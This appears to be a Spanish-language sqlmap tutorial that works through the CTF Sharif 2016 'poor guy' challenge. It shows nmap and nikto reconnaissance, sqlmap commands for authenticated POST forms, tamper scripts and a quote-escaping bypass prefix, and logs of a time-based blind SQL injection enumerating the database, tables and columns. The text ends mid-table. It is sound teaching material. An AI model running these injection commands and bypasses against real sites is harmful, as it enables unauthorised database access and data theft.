@@ -1,0 +1,829 @@
+﻿
+           _                       
+ ___  __ _| |_ __ ___   __ _ _ __  
+/ __|/ _` | | '_ ` _ \ / _` | '_ \ 
+\__ \ (_| | | | | | | | (_| | |_) |
+|___/\__, |_|_| |_| |_|\__,_| .__/ 
+        |_|                 |_|    
+		
+by IPI
+
+* sqlmap 
+
+* VERSION: 20161218
+
+* CONTENIDOS:
+
+(00) CONCEPTOS BÁSICOS DE SQLMAP
+(01) RECONOCIMIENTO PREVIO
+	1.1) OS fingerprinting con nmap.
+	1.2) Nikto.
+(02) USO BÁSICO EN SITIOS SIN AUTENTICACIÓN (GET)
+(03) USO EN SITIOS CON AUTENTICACIÓN (POST) - EJEMPLO CTF SHARIF 2016
+	3.1) Ataque a la base de datos de autenticación.
+	3.2) Ataque a otra base de datos en un sitio protegido por autenticación.
+	3.3) Ataques a bases de datos con protecciones - Tamper scripts.
+	3.4) Ataques a sitios con token anti-CSRF.
+(04) SOLUCIÓN DEL EJEMPLO CTF SHARIF 2016.
+	4.1) Descubrimiento de vulnerabilidades.
+	4.2) Descubrimiento de bases de datos.
+	4.3) Descubrimiento de tablas de las bases de datos.
+	4.4) Descubrimiento de columnas de las tablas.
+	4.5) Extracción de datos de la base de datos.
+	
+
+* REFERENCIAS:
+
+sqlmap
+http://sqlmap.org/
+
+sqlmapproject/sqlmap/wiki/Usage
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+Introduction to SQLmap (Graceful Security)
+https://www.gracefulsecurity.com/introduction-to-sqlmap/
+
+Sqlmap tutorial for beginners – hacking with sql injection
+http://www.binarytides.com/sqlmap-hacking-tutorial/
+
+Bypassing Web Application Firewalls with SQLMap Tamper Scripts
+http://websec.ca/blog/view/Bypassing_WAFs_with_SQLMap
+
+sqlmapproject/sqlmap/tamper
+https://github.com/sqlmapproject/sqlmap/tree/master/tamper
+
+
+====================================================================================================
+(00) CONCEPTOS BÁSICOS DE SQLMAP
+====================================================================================================
+
+sqlmap es una herramienta de pentesting open source que automatiza el proceso de detectar y explotar
+vulnerabilidades de inyección SQL, así como de comprometer a servidores de bases de datos.
+
+https://github.com/sqlmapproject/sqlmap/wiki/Features
+
+* Funcionalidades:
+
+- Motor de detección de bases de datos.
+- Detección de vulnerabilidades de SQLi.
+- Recolección de datos de las bases de datos comprometidas.
+- Acceso al sistema de ficheros bajo la base de datos.
+- Ejecución de comandos en el sistema operativo de la máquina de la base de datos comprometida.
+
+* Bases de datos soportadas:
+
+MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, 
+Sybase, SAP MaxDB, HSQLDB, Informix.
+
+* Técnicas de inyección:
+
+boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, out-of-band.
+
+
+====================================================================================================
+(01) RECONOCIMIENTO PREVIO
+====================================================================================================
+
+Puede ser de interés realizar un reconocimiento previo del sitio web que aloja la base de datos,
+para identificar vulnerabilidades o incluso el tipo de sistema operativo (lo que nos ayudaría
+a descartar algunos tipos de DBMS).
+
+-----------------------------------------------------------------------------------------------------
+1.1) OS FINGERPRINTING CON NMAP
+
+# nmap -O ctf.sharif.edu
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-12-18 04:25 CET
+Nmap scan report for ctf.sharif.edu (213.233.175.130)
+Host is up (0.011s latency).
+Not shown: 974 filtered ports
+PORT     STATE  SERVICE
+25/tcp   open   smtp
+80/tcp   open   http
+110/tcp  open   pop3
+119/tcp  open   nntp
+143/tcp  open   imap
+465/tcp  open   smtps
+563/tcp  open   snews
+587/tcp  open   submission
+993/tcp  open   imaps
+995/tcp  open   pop3s
+1600/tcp closed issd
+4000/tcp open   remoteanything
+4001/tcp closed newoak
+4002/tcp open   mlchat-proxy
+4003/tcp closed pxc-splr-ft
+4005/tcp closed pxc-pin
+4006/tcp closed pxc-spvr
+8081/tcp open   blackice-icecap
+8082/tcp open   blackice-alerts
+8083/tcp open   us-srv
+8084/tcp open   unknown
+8085/tcp open   unknown
+8086/tcp open   d-s-n
+8087/tcp open   simplifymedia
+8088/tcp closed radan-http
+8089/tcp open   unknown
+Device type: WAP|general purpose|storage-misc
+Running (JUST GUESSING): Actiontec embedded (95%), Linux 2.4.X|3.X (95%), Microsoft Windows 7|2012|XP (91%), BlueArc embedded (86%)
+OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:linux:linux_kernel:3.2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_xp::sp3 cpe:/h:bluearc:titan_2100
+Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (95%), DD-WRT v24-sp2 (Linux 2.4.37) (95%), Linux 3.2 (95%), Microsoft Windows 7 or Windows Server 2012 (91%), Microsoft Windows XP SP3 (90%), BlueArc Titan 2100 NAS device (86%)
+No exact OS matches for host (test conditions non-ideal).
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 180.62 seconds
+
+
+-----------------------------------------------------------------------------------------------------
+1.2) NIKTO
+
+# nikto +host http://ctf.sharif.edu:8086
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          213.233.175.130
++ Target Hostname:    ctf.sharif.edu
++ Target Port:        8086
++ Start Time:         2016-12-18 02:25:36 (GMT1)
+---------------------------------------------------------------------------
++ Server: nginx/1.6.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie PHPSESSID created without the httponly flag
++ Root page / redirects to: login/index.php
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-3092: /login/: This might be interesting...
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7502 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2016-12-18 03:15:24 (GMT1) (2988 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+====================================================================================================
+(02) USO BÁSICO EN SITIOS SIN AUTENTICACIÓN (GET)
+====================================================================================================
+
+Si el sitio web que aloja a la base de datos está abierto (sin autenticación) y se conoce el punto
+de entrada a la base de datos del back-end, mediante GET, se puede lanzar sqlmap directamente:
+
+# python sqlmap.py -u "http://vuln.example.org/sql?id=123&page=10"
+
+# sqlmap -u "http://vuln.example.org/sql?id=123&page=10"
+
+Si a priori se conoce que un parámetro es vulnerable a SQLi, se puede especificar para ahorrar
+tiempo:
+
+# sqlmap -u "http://vuln.example.org/sql?id=123&page=10" -p id
+
+Si se desea realizar un ataque más avanzado (a costa de que sea más lento)
+
+# sqlmap -u "http://vuln.example.org/sql?id=123&page=10" --level 5 --risk 3
+
+Siendo:
+
+--level: nivel de tests a realizar (1-5). Por defecto, 1
+--risk: riesgo de los tests a realizar (1-3). Por defecto, 1.
+
+El ataque puede acelerarse lanzando varios hilos simultáneamente, usando --threads:
+
+# sqlmap -u "http://vuln.example.org/sql?id=123&page=10" --level 5 --risk 3 --threads 10
+
+
+Si se conoce el tipo de base de datos a atacar porque se ha obtenido por otros medios, se puede
+especificar mediante --dbms:
+
+# sqlmap -u "http://vuln.example.org/sql?id=123&page=10" --dbms mssql
+
+
+
+====================================================================================================
+(03) USO EN SITIOS CON AUTENTICACIÓN (POST) - EJEMPLO CTF SHARIF 2016
+====================================================================================================
+
+Nota: ejemplos basados en el reto 'poor guy' del CTF Sharif 2016.
+
+----------------------------------------------------------------------------------------------------
+3.1) ATAQUE A LA BASE DE DATOS DE AUTENTICACIÓN:
+
+Si la base de datos está en un sitio web protegido por autenticación básica y conocemos el usuario
+y el password, lo primero es analizar el código de la página web de autenticación para determinar el
+nombre de las variables usadas. Por ejemplo:
+
+<div class="login-page">
+	<div class="form">
+		<form method="post" action="" class="login-form">
+						<input type="text" placeholder="username" name="username"/>
+			<input type="password" placeholder="password" name="password"/>
+			<button type="submit">login</button>
+		</form>
+	</div>
+</div>
+
+En este ejemplo, 'username' y 'password':
+
+# sqlmap -u "http://ctf.sharif.edu:8086/login/index.php" --data "username=foo&password=bar"
+
+
+Puede darse el caso de que además se precise una cookie para mantener la sesión con cada intento
+que realice sqlmap. En este caso, lo mejor es utilizar un proxy como Burp Proxy:
+
+1) Arrancar Burp Proxy y establecer 'Proxy -> Intercept -> Intercept is on'.
+
+2) Configurar el navegador para que use el proxy: 'http://localhost:8080'.
+
+3) Navegar a la página de login y realizar el login con las credenciales disponibles.
+
+Para cada POST que se realice en este proceso, la petición aparecerá en 'Proxy -> Intercept'. Una
+vez analizada, se deja progresar con 'Forward'. En alguna de las peticiones se acabará viendo la
+cookie asignada por el servidor web:
+
+-------------------------------
+POST /login/index.php HTTP/1.1
+Host: ctf.sharif.edu:8086
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ctf.sharif.edu:8086/login/index.php
+Cookie: PHPSESSID=iq4fsstg9fu7mng8migus9p6e6
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+
+username=poorguy&password=withnomoney
+-------------------------------
+
+Nota: en Burp también se pueden ver las respuestas del servidor, en la pestaña 'Response'
+
+Para utilizar la cookie:
+
+# sqlmap -u "http://ctf.sharif.edu:8086/login/index.php" --data "username=foo&password=bar" --cookie "PHPSESSID=iq4fsstg9fu7mng8migus9p6e6"
+
+----------------------------------------------------------------------------------------------------
+3.2) ATAQUE A OTRA BASE DE DATOS EN UN SITIO PROTEGIDO POR AUTENTICACIÓN:
+
+En el ejemplo anterior, el POST se ha realizado contra '/login/index.php' y permitiría atacar a la base 
+de datos de usuarios de autenticación al sitio web (si la hay).
+
+Pero puede darse el caso de que la base de datos a atacar sea otra y esté accesible a través de otra
+página del sitio, por ejemplo en '/index.php' sabemos que hay una base de datos de libros que podemos
+atacar. Se puede analizar el código de esta página con Burp, viendo la respuesta a la petición de 
+acceso a la misma. Por ejemplo:
+
+HTTP/1.1 200 OK
+Server: nginx/1.6.1
+Date: Sat, 17 Dec 2016 19:25:10 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 4548
+Connection: close
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+
+<!DOCTYPE html>
+
+/...../
+	    		    <form class="form-group" action='' method='post'>
+	    		    		    		    	<div class="input-group">
+	    	                <span class="input-group-addon"><span class="glyphicon glyphicon-book"></span></span>
+		                    <input type='text' name='book_serial' placeholder="Book Serial" class="form-control"/>
+		                    <span class="input-group-btn">
+		                    	<button type="submit" class="btn btn-default form-control">
+		                    		<span class="glyphicon glyphicon-download-alt"></span>
+			                    	Add book
+		                    	</button>
+		                    </span>
+	                    </div>
+	                    <span class="help-block">Add your books here with their serial we sent you with email.</span>
+                    </form>
+                    <form class="form-group" action='' method='post'>
+	                    	    		    	<div class="input-group">
+		                    <select name="book_selection" class="form-control">
+								<option value="9780060878849">Poor people</option><option value="9781118380932">Hacking for dummies</option>							</select>
+							<span class="input-group-btn">
+		                    	<button type="submit" class="btn btn-default form-control">
+			                    	<span class="glyphicon glyphicon-search"></span>
+			                    	View
+		                    	</button>
+		                    </span>
+	                    </div>
+	                    <span class="help-block">Select a book for viewing among those you already have.</span>
+                    </form>
+/...../
+
+Observamos que existen dos puntos de entrada: 
+
+<input type='text' name='book_serial' placeholder="Book Serial" class="form-control"/>
+<select name="book_selection" class="form-control">
+
+'book_serial': podemos introducir el número de serie de un libro para darlo de alta en la base de datos.
+'book_selection': combo con títulos de libros ya almacenados en la base de datos, para obtener sus detalles.
+
+Desde el navegador, introducimos un número de serie válido para 'book_serial' (por ejemplo, 9781118380932)
+y en Burp analizamos los POST:
+
+-------------------------------
+POST /index.php HTTP/1.1
+Host: ctf.sharif.edu:8086
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ctf.sharif.edu:8086/index.php
+Cookie: PHPSESSID=iq4fsstg9fu7mng8migus9p6e6
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+book_serial=9781118380932
+-------------------------------
+
+Para automatizar completamente el ataque, podemos guardar este request en un fichero de texto plano
+llamado 'raw', que usaremos como base para el ataque por sqlmap (que será capaz de parsearlo).
+
+Como en este request ya está la cookie, a sqlmap no le saltará la página de login inicial. También
+está el parámetro 'book_serial', que sqlmap usará para lanzar los ataques.
+
+# sqlmap -r raw --level 5 --risk 3 --threads 10
+
+Si queremos ver cada petición que hace sqlmap en el ataque y cada respuesta del servidor, podemos 
+aprovechar a Burp:
+
+# sqlmap -r raw --proxy http://localhost:8080 --level 5 --risk 3 --threads 10							
+
+
+----------------------------------------------------------------------------------------------------
+3.3) ATAQUES A BASES DE DATOS CON PROTECCIONES - TAMPER SCRIPTS:
+
+Puede darse el caso de que el sitio con la base de datos esté detrás de un WAF o que incluso el
+propio servidor implemente el chequeo de entradas para evitar inyecciones. En nuestro ejemplo,
+se sabe que el servidor implementa la siguiente protección:
+
+$input_escaped = str_replace("'","\'",$user_input);
+
+Es decir, cualquier entrada con comilla simple "'" será sustituída por "\'".
+
+Sqlmap implementa scripts de tampering para saltar este tipo de protecciones, que pueden invocarse
+con el modificador --tamper:
+
+https://github.com/sqlmapproject/sqlmap/tree/master/tamper
+
+Para este ejemplo y con la información disponible, puede ser de utilidad 'unmagicquotes':
+
+# sqlmap -r raw --level 5 --risk 3 --threads 10 --tamper=unmagicquotes
+# sqlmap -r raw --proxy http://localhost:8080 --level 5 --risk 3 --threads 10 --tamper=unmagicquotes							
+
+También se puede lanzar un ataque masivo usando todos los scripts disponibles, a costa de que
+sea muy lento:
+
+# sqlmap -r raw --level 5 --risk 3 --threads 10 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+
+En su ejecución, sqlmap irá informando de cada ataque realizado y de sus resultados:
+
+[04:01:09] [INFO] POST parameter 'book_selection' appears to be 'MySQL >= 5.0 boolean-based blind - Stacked queries' injectable (with --code=200)
+[04:06:20] [INFO] target URL appears to be UNION injectable with 81 columns
+[04:09:42] [INFO] checking if the injection point on POST parameter 'book_selection' is a false positive
+[04:09:43] [WARNING] false positive or unexploitable injection point detected
+[04:09:43] [WARNING] POST parameter 'book_selection' does not seem to be injectable
+
+Nota: otro mecanismo de interés para evadir protecciones es el uso de prefijos (--prefix) y
+sufijos (--suffix) para el payload de los ataques de sqlmap. En ocasiones es imprescindible su
+uso para que los ataques tengan éxito. Ejemplo en el apartado 4.
+
+
+----------------------------------------------------------------------------------------------------
+3.4) ATAQUES A SITIOS CON TOKEN ANTI-CSRF
+
+En algunos casos, el sitio web puede implementar un token que varía con cada uso y cuya finalidad
+es evitar ataques de CSRF (Cross-Site Request Forgery):
+
+-------------------------------
+POST /index.php HTTP/1.1
+Host: ctf.sharif.edu:8086
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ctf.sharif.edu:8086/index.php
+Cookie: PHPSESSID=iq4fsstg9fu7mng8migus9p6e6; csrftoken=BVsbyzkvr24r8ze89Bm5Qr7ddIWOHAEHwHWsZ8n5TnvtIocVgBHa300lS9n5xLku; sessionid=tc4kbz0ww4tnt5q91jaun7uwdqzixbbe
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+
+book_serial=239rj2if3r23re
+-------------------------------
+
+Para estos casos, sqlmap implementa los modificadores --csrf-url y --csrf-token.
+
+La complicación puede venir si el token se genera en una página distinta a la de acceso a la
+base de datos.
+
+
+====================================================================================================
+(04) SOLUCIÓN DEL EJEMPLO CTF SHARIF 2016.
+====================================================================================================
+
+Referencia: http://security.szurek.pl/sharifctf-7-web-writeup.html#poor-guy
+
+El objetivo (flag) es conseguir el número de serie de un libro denominado 'Secret flag' y que está
+almacenado en alguna base de datos del servidor.
+
+Se ataca a través de una de las dos entradas identificadas a la base de datos: 'book_selection'
+(ver apartado 3.2).
+
+Se saca partido del conocimiento de que la web del backend depura las siguientes entradas:
+$input_escaped = str_replace("'","\'",$user_input);
+
+Para ello, se configura sqlmap para que todos los payloads que usa comiencen por un prefijo que
+se salte esta protección:
+
+<prefix><sqlmap_payload><suffix>
+
+Por ejemplo:
+
+\' -> será sustituido por \\' antes ser pasado a la consulta. Es decir, se escapará la "\"
+en lugar de la "'", por lo que la "'" servirá como separador válido para el payload que viene
+a continuación.
+
+----------------------------------------------------------------------------------------------------
+4.1) DESCUBRIMIENTO DE VULNERABILIDADES:
+
+Se ataca a la entrada 'book_selection', presuponiendo base de datos MySQL, con una cookie capturada
+(ver apartado 3.1), nivel de riesgo 3 y el prefijo indicado anteriormente:
+
+# sqlmap -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --prefix="\'" --cookie="PHPSESSID=iq4fsstg9fu7mng8migus9p6e6" --dbms=MySQL --risk=3
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.0.12#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:01:27
+
+[23:01:27] [INFO] testing connection to the target URL
+[23:01:29] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[23:01:30] [INFO] testing if the target URL is stable
+[23:01:30] [INFO] target URL is stable
+[23:01:30] [INFO] testing if POST parameter 'book_selection' is dynamic
+[23:01:31] [WARNING] POST parameter 'book_selection' does not appear to be dynamic
+[23:01:31] [WARNING] heuristic (basic) test shows that POST parameter 'book_selection' might not be injectable
+[23:07:13] [INFO] testing for SQL injection on POST parameter 'book_selection'
+[23:07:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:07:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[23:07:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[23:07:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[23:07:25] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[23:07:26] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[23:07:27] [INFO] testing 'MySQL inline queries'
+[23:07:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[23:07:29] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
+[23:07:51] [INFO] POST parameter 'book_selection' appears to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) value? [Y/n] Y
+[23:08:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[23:08:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[23:08:37] [INFO] checking if the injection point on POST parameter 'book_selection' is a false positive
+POST parameter 'book_selection' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 83 HTTP(s) requests:
+---
+Parameter: book_selection (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: book_selection=a\' OR SLEEP(5)-- hYMv
+---
+[23:09:14] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.12
+[23:09:14] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+
+[*] shutting down at 23:09:14
+
+-- sqlmap ha descubierto que la entrada 'book_selection' es vulnerable a 'AND/OR time-based blind' SQLi.
+-- Observamos que se ha guardado información adicional, que sqlmap usará para actividades posteriores:
+
+# ls -al /home/isma/.sqlmap/output/ctf.sharif.edu
+total 24
+drwxr-xr-x 2 isma isma 4096 Dec 18 23:09 .
+drwxr-xr-x 3 isma isma 4096 Dec 18 23:01 ..
+-rw-r--r-- 1 isma isma  326 Dec 18 23:09 log
+-rw-r--r-- 1 isma isma 8192 Dec 18 23:09 session.sqlite
+-rw-r--r-- 1 isma isma   52 Dec 18 23:01 target.txt
+
+
+----------------------------------------------------------------------------------------------------
+4.2) DESCUBRIMIENTO DE BASES DE DATOS:
+
+Lanzamos sqlmap con los mismos parámetros pero añadiendo --dbs, para realizar el descubrimiento de
+bases de datos:
+
+# sqlmap -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --prefix="\'" --cookie="PHPSESSID=iq4fsstg9fu7mng8migus9p6e6" --dbms=MySQL --risk=3 --dbs
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.0.12#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:22:35
+
+[23:22:36] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: book_selection (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: book_selection=a\' OR SLEEP(5)-- hYMv
+---
+[23:22:36] [INFO] testing MySQL
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[23:23:02] [INFO] confirming MySQL
+[23:23:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[23:23:22] [INFO] adjusting time delay to 1 second due to good response times
+[23:23:23] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+[23:23:23] [INFO] fetching database names
+[23:23:23] [INFO] fetching number of databases
+[23:23:23] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+
+[23:23:38] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[23:23:38] [ERROR] unable to retrieve the number of databases
+[23:23:38] [INFO] falling back to current database
+[23:23:38] [INFO] fetching current database
+[23:23:38] [INFO] retrieved: book_shop
+available databases [1]:
+[*] book_shop
+
+[23:25:11] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+
+[*] shutting down at 23:25:11
+
+
+-- Observamos que sqlmap ha descubierto una base de datos llamada 'book_shop'. Ahora interesa
+   conocer qué tablas tiene esta base de datos.
+
+----------------------------------------------------------------------------------------------------
+4.3) DESCUBRIMIENTO DE TABLAS DE LAS BASES DE DATOS:
+
+Lanzamos el mismo sqlmap pero sin --dbs y añadiendo --tables -D book_shop, para descubrir las tablas
+de esta base de datos:
+
+# sqlmap -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --prefix="\'" --cookie="PHPSESSID=iq4fsstg9fu7mng8migus9p6e6" --dbms=MySQL --risk=3 --tables -D book_shop
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.0.12#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:30:39
+
+[23:30:39] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: book_selection (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: book_selection=a\' OR SLEEP(5)-- hYMv
+---
+[23:30:39] [INFO] testing MySQL
+[23:30:39] [INFO] confirming MySQL
+[23:30:39] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+[23:30:39] [INFO] fetching tables for database: 'book_shop'
+[23:30:39] [INFO] fetching number of tables for database 'book_shop'
+[23:30:39] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+[23:30:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[23:31:34] [INFO] adjusting time delay to 1 second due to good response times
+3
+[23:31:35] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+book
+[23:32:29] [ERROR] invalid character detected. retrying..
+[23:32:29] [WARNING] increasing time delay to 2 seconds 
+s
+[23:32:44] [INFO] retrieved: 
+[23:33:09] [ERROR] invalid character detected. retrying..
+[23:33:09] [WARNING] increasing time delay to 3 seconds 
+login
+[23:35:12] [INFO] retrieved: o
+[23:36:10] [ERROR] invalid character detected. retrying..
+[23:36:10] [WARNING] increasing time delay to 4 seconds 
+wned_books
+Database: book_shop
+[3 tables]
++-------------+
+| books       |
+| login       |
+| owned_books |
++-------------+
+
+[23:41:18] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+
+[*] shutting down at 23:41:18
+
+-- Observamos que sqlmap ha descubierto las siguientes tablas:
+
+books
+login
+owned_books
+
+-- A continuación, buscaremos qué columnas tiene la tabla de interés 'books'.
+
+
+----------------------------------------------------------------------------------------------------
+4.4) DESCUBRIMIENTO DE COLUMNAS DE LAS TABLAS:
+
+Lanzamos el siguiente sqlmap:
+
+# sqlmap -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --prefix="\'" --cookie="PHPSESSID=iq4fsstg9fu7mng8migus9p6e6" --dbms=MySQL --risk=3 --columns -D book_shop -T books
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.0.12#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:46:21
+
+[23:46:22] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: book_selection (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: book_selection=a\' OR SLEEP(5)-- hYMv
+---
+[23:46:22] [INFO] testing MySQL
+[23:46:22] [INFO] confirming MySQL
+[23:46:22] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+[23:46:22] [INFO] fetching columns for table 'books' in database 'book_shop'
+[23:46:22] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[23:47:17] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[23:47:29] [INFO] adjusting time delay to 1 second due to good response times
+[23:47:29] [ERROR] invalid character detected. retrying..
+[23:47:29] [WARNING] increasing time delay to 2 seconds 
+[23:47:40] [ERROR] invalid character detected. retrying..
+[23:47:40] [WARNING] increasing time delay to 3 seconds 
+6
+[23:48:00] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+book_id
+[23:51:00] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+int(11)
+[23:53:54] [INFO] retrieved: book_name
+[23:57:19] [INFO] retrieved: varchar(250)
+[00:01:14] [INFO] retrieved: book_serial
+[00:05:12] [INFO] retrieved: varchar(60)
+[00:08:59] [INFO] retrieved: book_isbn
+[00:12:30] [INFO] retrieved: varchar(60)
+[00:16:17] [INFO] retrieved: book_cover
+[00:20:13] [INFO] retrieved: varchar(50)
+[00:23:53] [INFO] retrieved: is
+[00:24:52] [INFO] adjusting time delay to 2 seconds due to good response times
+_premium
+[00:26:46] [INFO] retrieved: 
+[00:26:59] [INFO] adjusting time delay to 1 second due to good response times
+tinyint(1)
+Database: book_shop
+Table: books
+[6 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| book_cover  | varchar(50)  |
+| book_id     | int(11)      |
+| book_isbn   | varchar(60)  |
+| book_name   | varchar(250) |
+| book_serial | varchar(60)  |
+| is_premium  | tinyint(1)   |
